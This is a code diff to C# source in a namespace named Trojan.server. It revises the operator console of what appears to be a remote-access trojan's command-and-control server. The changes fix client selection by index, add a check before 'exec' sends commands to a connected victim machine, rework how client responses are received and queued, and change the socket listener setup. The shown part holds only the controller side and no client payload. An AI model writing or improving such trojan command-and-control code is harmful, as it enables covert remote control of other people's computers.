@@ -25,8 +25,7 @@ namespace Trojan.server
                 failedCMD = false;
                 sendCMD = false;
                 try
-                {
-                    await Task.Delay(300);
+                {                   
                     Console.Write("\r\nEnter command:\t");
                     CMD = Console.ReadLine();
 
@@ -57,7 +56,7 @@ namespace Trojan.server
                                 int.TryParse(arguments[1], out connectSelection);
 
                                 int ConnectIndex = connectSelection - 1;
-                                if (ConnectIndex >= ConnectionManager.connections.Count())
+                                if (ConnectIndex >= ConnectionManager.connections.Count() || ConnectIndex <= -1)
                                 {
                                     Console.WriteLine("\n[|] connection [{0}] doesnt exist", ConnectIndex + 1);
                                     continue;
@@ -75,6 +74,11 @@ namespace Trojan.server
                             }
                             else if (TruncationCheckCommand(CMD, 0, 4) == "exec")
                             {
+                                if(connectedToClient == null)
+                                {
+                                    Console.WriteLine("\n[|] you need to connect to a clint before executing client-side commands");
+                                }
+
                                 string[] arguments = CMD.Substring(3).Split(" ");
 
                                 string SelectedCommand = arguments[1];
@@ -119,10 +123,11 @@ namespace Trojan.server
                         }
                         catch (Exception error) { Console.WriteLine(error); failedCMD = true; }
 
-                        if (connectedToClient != null && !failedCMD && sendCMD == true)
+                        if (connectedToClient != null && !failedCMD && sendCMD)
                         {
                             await connectedToClient.SendAsync(Encoding.UTF8.GetBytes(CMD), SocketFlags.None);
                             SenderStatus = ServerStatus.WAITRESPONSE;
+                            Console.ReadKey();
                         }
                     }
                 }
@@ -145,29 +150,35 @@ namespace Trojan.server
                     for (int i = 0; i < ConnectionManager.connections.Count(); i++)
                     {
                         CurrentConnection = ConnectionManager.connections[i];
-                        await CurrentConnection.getConn().ReceiveAsync(CurrentConnection.getBuffer(), SocketFlags.None);
 
+                        if (CurrentConnection.getReceiveTask() == null)
+                        {
+                            Task ReceiveTask = Task.Factory.StartNew(() => CurrentConnection.getConn().ReceiveAsync(CurrentConnection.getBuffer(), SocketFlags.None));
+                            CurrentConnection.setReceiveTask(ReceiveTask);
+                        }
+                       
                         string message = Encoding.UTF8.GetString(CurrentConnection.getBuffer()).Replace("\0", "");
                         if (CurrentConnection.getBuffer().Length > 0 && message.Length > 0)
                         {
                             ConnectionManager.DataQueue.Enqueue(message);
                             Array.Clear(CurrentConnection.getBuffer(), 0, CurrentConnection.getBuffer().Length);
                         }
-                        else
-                        {
-                            throw new ExceptionHandler("[-] ReceiveTask timed out : " + nameof(CurrentConnection));
-                        }
                     }
 
-                    ConnectionManager.OutputDataQueue();
-                    SenderStatus = ServerStatus.IDLE;
+                    if (ConnectionManager.DataQueue.Count() > 0)
+                    {
+                        ConnectionManager.OutputDataQueue();
+                    }
                 }
             }
         }
 
         public void Init_Server(ushort port, uint buffSize)
         {
-            Listener = _SocketOperations.Init_Socket(IPAddress.Parse("192.168.0.35"), new socketSetup(Guid.NewGuid().ToString(), port, buffSize));
+            if (HOST != null)
+            {
+                Listener = _SocketOperations.Init_Socket(HOST, new socketSetup(Guid.NewGuid().ToString(), port, buffSize));
+            }
 
             if (Listener.sock == null) throw new ExceptionHandler("[-] Socket can not be null : " + nameof(Listener.sock));
 
@@ -176,13 +187,13 @@ namespace Trojan.server
 
             Console.WriteLine("[+] Started listening on port :: {0} ;", Listener.port);
 
-            SenderStatus = ServerStatus.WAITRESPONSE;
+            ServerStatus = ServerStatus.RUNNING;
 
             Task.Factory.StartNew(() => _SocketOperations.Accept_Socket(Listener, SenderStatus));
             Task.Factory.StartNew(() => Receive_Socket());
-            Task.Factory.StartNew(() => Send_Socket());
 
-            ServerStatus = ServerStatus.RUNNING;
+            Console.ReadKey();
+            Task.Factory.StartNew(() => Send_Socket());
         }
     }
 }
